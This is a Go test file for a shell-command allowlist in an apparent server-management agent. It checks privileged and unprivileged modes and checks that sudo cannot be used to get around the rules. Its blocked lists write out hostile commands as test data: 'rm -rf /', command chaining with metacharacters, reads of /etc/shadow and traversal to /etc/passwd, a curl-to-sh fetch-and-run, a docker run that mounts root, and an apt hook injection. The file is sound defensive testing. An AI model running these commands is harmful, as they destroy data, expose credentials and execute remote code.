package main

import "testing"

func TestAllowlistUnprivileged(t *testing.T) {
	a := Allowlist{privileged: false}
	allowed := []string{
		"hostname", "uname -a", "df -h", "free -m", "uptime",
		"ls -la /var/log", "ps aux", "cat /var/log/syslog",
		"cat /etc/os-release", "docker ps", "systemctl status nginx.service",
	}
	for _, c := range allowed {
		if ok, reason := a.IsAllowed(c); !ok {
			t.Errorf("expected allowed: %q (%s)", c, reason)
		}
	}
	blocked := []string{
		"",                       // empty
		"rm -rf /tmp",            // not in allowlist
		"ls; rm -rf /",           // shell metachar
		"cat /etc/shadow",        // path not in cat prefixes
		"cat ../../etc/passwd",   // traversal
		"systemctl restart nginx", // privileged-only verb
		"apt-get install -y vim", // privileged-only
		"sudo systemctl restart nginx", // sudo w/o privileged
	}
	for _, c := range blocked {
		if ok, _ := a.IsAllowed(c); ok {
			t.Errorf("expected blocked: %q", c)
		}
	}
}

func TestAllowlistPrivileged(t *testing.T) {
	a := Allowlist{privileged: true}
	allowed := []string{
		"systemctl restart nginx.service",
		"systemctl start docker",
		"apt-get install -y vim",
		"docker pull nginx:latest",
		"docker stop web",
		"docker compose -f /opt/homepilot/docker-compose.yml up -d",
		"mkdir -p /opt/homepilot/data",
		"chmod 644 /opt/homepilot/x",
		"sudo systemctl restart nginx",
		"docker ps", // safe still allowed in privileged
	}
	for _, c := range allowed {
		if ok, reason := a.IsAllowed(c); !ok {
			t.Errorf("expected allowed (priv): %q (%s)", c, reason)
		}
	}
	blocked := []string{
		"rm -rf /",            // never allowed
		"systemctl restart nginx && rm -rf /", // metachar
		"curl http://evil",    // not in allowlist
		"sudo rm -rf /",       // sudo but not in sudo allowlist
	}
	for _, c := range blocked {
		if ok, _ := a.IsAllowed(c); ok {
			t.Errorf("expected blocked (priv): %q", c)
		}
	}
}

// #381: the sudo path must re-run the FULL allowlist (metachars + per-command
// argument regexes) against the wrapped command, so it can no longer be used to
// bypass the constraints the non-sudo path enforces.
func TestSudoDoesNotBypassArgRegexes(t *testing.T) {
	a := Allowlist{privileged: true}
	blocked := []string{
		"sudo docker run --volume /:/mnt --user 0 img",       // dangerous docker args
		"sudo apt-get install -o Dpkg::Pre-Invoke=/x -y curl", // apt pre-invoke hook
	}
	for _, c := range blocked {
		if ok, _ := a.IsAllowed(c); ok {
			t.Errorf("expected blocked (sudo bypass): %q", c)
		}
	}
	// A legitimately-allowed sudo command still passes.
	if ok, reason := a.IsAllowed("sudo systemctl restart nginx"); !ok {
		t.Errorf("expected allowed: %q (%s)", "sudo systemctl restart nginx", reason)
	}
	// And with leading sudo options stripped.
	if ok, reason := a.IsAllowed("sudo -n -u root systemctl restart nginx"); !ok {
		t.Errorf("expected allowed: %q (%s)", "sudo -n -u root systemctl restart nginx", reason)
	}
}

// #388: shell-script artifacts run over the agent by shipping a .sh under the
// HP write prefix and executing `bash <path>`. That form is privileged-only and
// locked to /opt/homepilot/*.sh; a piped heredoc or an arbitrary path is refused.
func TestBashScriptRunnerIsPrivilegedAndPathLocked(t *testing.T) {
	priv := Allowlist{privileged: true}
	unpriv := Allowlist{privileged: false}

	allowed := "bash /opt/homepilot/hp-artifact-apply.sh"
	if ok, reason := priv.IsAllowed(allowed); !ok {
		t.Errorf("expected allowed (priv): %q (%s)", allowed, reason)
	}
	if ok, _ := unpriv.IsAllowed(allowed); ok {
		t.Errorf("expected blocked (non-priv): %q", allowed)
	}

	blocked := []string{
		"bash /etc/evil.sh",                            // outside the write prefix
		"bash /opt/homepilot/x.sh; rm -rf /",           // shell metacharacters
		"bash /opt/homepilot/../etc/shadow",            // traversal out of prefix
		"bash /opt/homepilot/../etc/evil.sh",           // traversal ending .sh
		"bash /opt/homepilotevil/x.sh",                 // prefix-boundary confusion
		"bash -c 'curl http://x | sh'",                 // arbitrary -c payload
	}
	for _, c := range blocked {
		if ok, _ := priv.IsAllowed(c); ok {
			t.Errorf("expected blocked (priv): %q", c)
		}
	}
}
